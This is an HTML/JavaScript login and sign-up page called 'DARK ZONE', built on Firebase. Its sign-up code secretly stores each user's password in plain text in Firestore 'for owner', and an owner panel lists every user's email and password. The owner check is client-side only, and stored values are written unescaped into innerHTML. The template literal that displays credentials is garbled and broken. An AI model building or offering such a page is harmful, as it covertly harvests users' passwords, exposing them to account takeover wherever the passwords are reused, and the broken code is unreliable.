<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>DARK ZONE • Access</title>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-auth-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-firestore-compat.js"></script>
  <style>
    :root {
      --bg: #0f0c29;
      --card: rgba(48,43,99,0.5);
      --accent: #00f260;
      --danger: #ff3366;
      --text: #e0e0ff;
    }
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: system-ui, sans-serif;
      background: linear-gradient(135deg, var(--bg), #24243e);
      color: var(--text);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .container {
      max-width: 480px;
      width: 100%;
      background: var(--card);
      backdrop-filter: blur(12px);
      border-radius: 16px;
      padding: 40px 30px;
      border: 1px solid rgba(0,242,96,0.2);
      box-shadow: 0 15px 50px rgba(0,0,0,0.7);
    }
    h1 {
      text-align: center;
      font-size: 3.2rem;
      background: linear-gradient(90deg, #00f260, #0575e6, #ff00aa);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 2rem;
    }
    .tabs {
      display: flex;
      margin-bottom: 1.8rem;
      gap: 8px;
    }
    .tab {
      flex: 1;
      padding: 12px;
      background: rgba(255,255,255,0.08);
      border: none;
      border-radius: 50px;
      color: white;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s;
    }
    .tab.active {
      background: var(--accent);
      color: black;
    }
    input {
      width: 100%;
      padding: 14px 16px;
      margin: 12px 0;
      background: rgba(0,0,0,0.45);
      border: 1px solid rgba(255,255,255,0.15);
      border-radius: 10px;
      color: white;
      font-size: 1.1rem;
    }
    button.main-btn {
      width: 100%;
      padding: 14px;
      margin: 12px 0;
      background: var(--accent);
      color: black;
      border: none;
      border-radius: 50px;
      font-size: 1.15rem;
      font-weight: bold;
      cursor: pointer;
    }
    button.main-btn:hover { transform: scale(1.02); }
    #error {
      color: var(--danger);
      text-align: center;
      margin: 10px 0;
      min-height: 20px;
    }
    #main {
      display: none;
      max-width: 900px;
      margin: 20px auto;
    }
    #owner-panel {
      background: rgba(255,51,102,0.25);
      padding: 20px;
      border-radius: 12px;
      margin-top: 30px;
    }
    .user-row {
      padding: 12px;
      border-bottom: 1px solid rgba(255,255,255,0.1);
      font-size: 0.95rem;
    }
  </style>
</head>
<body>

  <!-- AUTH SCREEN -->
  <div class="container" id="auth">
    <h1>DARK ZONE</h1>

    <div class="tabs">
      <button class="tab active" onclick="show('login')">Login</button>
      <button class="tab" onclick="show('signup')">Sign Up</button>
    </div>

    <div id="login">
      <input id="l-email" type="email" placeholder="Email" autocomplete="off"/>
      <input id="l-pass" type="password" placeholder="Password"/>
      <button class="main-btn" onclick="login()">Enter</button>
    </div>

    <div id="signup" style="display:none">
      <input id="s-email" type="email" placeholder="Email"/>
      <input id="s-pass" type="password" placeholder="Password"/>
      <button class="main-btn" onclick="signup()">Create</button>
    </div>

    <div id="error"></div>
  </div>

  <!-- MAIN DASHBOARD (hidden) -->
  <div id="main">
    <div class="container">
      <h1>DARK ZONE</h1>
      <p style="text-align:center;margin-bottom:2rem;">Logged in as: <strong id="current-user"></strong></p>
      <button onclick="logout()" style="background:var(--danger);color:white;width:100%;padding:14px;border-radius:50px;border:none;font-weight:bold;cursor:pointer">Logout</button>

      <div id="owner-panel" style="display:none">
        <h3>OWNER ACCESS • All Accounts</h3>
        <div id="users-list"></div>
      </div>

      <!-- Add your AI chat + wall code here -->
      <div style="margin-top:40px;text-align:center">
        <h2>Content Area</h2>
        <p>Paste AI chat + public wall code here</p>
      </div>
    </div>
  </div>

  <script>
    const firebaseConfig = {
      // PASTE YOUR CONFIG HERE
      apiKey: "AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
      authDomain: "your-project.firebaseapp.com",
      projectId: "your-project",
      storageBucket: "your-project.appspot.com",
      messagingSenderId: "123456789012",
      appId: "1:123456789012:web:xxxxxxxxxxxxxxxx"
    };

    firebase.initializeApp(firebaseConfig);
    const auth = firebase.auth();
    const db = firebase.firestore();

    function show(tab) {
      document.getElementById('login').style.display = tab === 'login' ? 'block' : 'none';
      document.getElementById('signup').style.display = tab === 'signup' ? 'block' : 'none';
      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      event.target.classList.add('active');
    }

    function err(msg) {
      document.getElementById('error').textContent = msg;
      setTimeout(() => document.getElementById('error').textContent = '', 4000);
    }

    function login() {
      const email = document.getElementById('l-email').value.trim();
      const pass = document.getElementById('l-pass').value;
      if (!email || !pass) return err("Fill both fields");

      auth.signInWithEmailAndPassword(email, pass)
        .then(userCred => afterLogin(userCred.user))
        .catch(e => err(e.message));
    }

    function signup() {
      const email = document.getElementById('s-email').value.trim();
      const pass = document.getElementById('s-pass').value;
      if (!email || !pass) return err("Fill both fields");

      auth.createUserWithEmailAndPassword(email, pass)
        .then(userCred => {
          db.collection('users').doc(userCred.user.uid).set({
            email,
            password: pass,           // plain text for owner
            uid: userCred.user.uid,
            createdAt: firebase.firestore.FieldValue.serverTimestamp()
          });
          afterLogin(userCred.user);
        })
        .catch(e => err(e.message));
    }

    function afterLogin(user) {
      document.getElementById('auth').style.display = 'none';
      document.getElementById('main').style.display = 'block';
      document.getElementById('current-user').textContent = user.email;

      if (user.email === 'dark') {
        document.getElementById('owner-panel').style.display = 'block';
        loadUsers();
      }
    }

    function loadUsers() {
      db.collection('users').get().then(snap => {
        const list = document.getElementById('users-list');
        list.innerHTML = '';
        snap.forEach(doc => {
          const d = doc.data();
          const row = document.createElement('div');
          row.className = 'user-row';
          row.innerHTML = `Email: <b>\( {d.email}</b> | Pass: <b> \){d.password}</b>`;
          list.appendChild(row);
        });
      });
    }

    function logout() {
      auth.signOut().then(() => {
        document.getElementById('main').style.display = 'none';
        document.getElementById('auth').style.display = 'block';
      });
    }

    // Auto check
    auth.onAuthStateChanged(user => {
      if (user) afterLogin(user);
    });
  </script>
</body>
</html>
